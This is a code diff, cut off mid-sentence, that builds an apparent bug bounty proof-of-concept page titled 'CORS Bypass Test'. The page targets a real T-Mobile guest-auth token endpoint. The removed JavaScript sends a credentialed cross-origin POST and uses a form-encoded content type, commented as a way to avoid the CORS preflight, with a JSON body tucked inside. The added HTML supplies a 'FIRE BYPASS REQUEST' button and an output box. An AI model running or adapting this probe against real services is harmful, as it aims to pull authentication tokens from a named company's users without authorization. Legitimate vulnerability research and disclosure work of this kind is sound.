@@ -1,26 +1,37 @@
-document.getElementById('runBtn').onclick = function() {
-    var output = document.getElementById('output');
-    output.innerText = "Attempting Simple Request bypass...";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T-Mobile Bug Bounty PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 30px; background-color: #f9f9f9; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; border: 2px solid #e20074; }
+        h1 { color: #e20074; text-align: center; }
+        #runBtn { 
+            display: block; width: 100%; padding: 20px; font-size: 1.2em; 
+            background-color: #e20074; color: white; border: none; 
+            border-radius: 5px; cursor: pointer; font-weight: bold; 
+        }
+        #runBtn:hover { background-color: #b1005b; }
+        #output { 
+            margin-top: 20px; background: #222; color: #0f0; 
+            padding: 15px; border-radius: 5px; min-height: 150px; 
+            overflow: auto; white-space: pre-wrap; font-family: monospace;
+        }
+        .info { font-size: 0.85em; color: #666; margin-top: 10px; }
+    </style>
+</head>
+<body>
 
-    var target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens?v=' + Date.now();
+<div class="container">
+    <h1>CORS Bypass Test</h1>
+    <p>Target: <code>adn.t-mobile.com/.../tokens</code></p>
+    
+    <button id="runBtn">FIRE BYPASS REQUEST</button>
+    
+    <h3>Result Output:</h3>
+    <pre id="output">Click the button above. If the box stays green/empty but the Network tab shows a 200, the data is being "leaked" but blocked by the browser UI.</pre>
 
-    fetch(target, {
-        method: 'POST',
-        mode: 'cors',
-        credentials: 'include',
-        headers: {
-            // This content-type does NOT trigger an OPTIONS preflight
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        // We send JSON inside a form-encoded body to see if the backend parses it anyway
-        body: '{"grant_type":"guest"}' 
-    })
-    .then(function(response) {
-        return response.text().then(function(text) {
-            output.innerText = "Status: " + response.status + "\n\nBody: " + text;
-        });
-    })
-    .catch(function(err) {
-        output.innerText = "Fetch Error: " + err;
-    });
-};
+    <div class="info">
+        <b>Note:</b> We
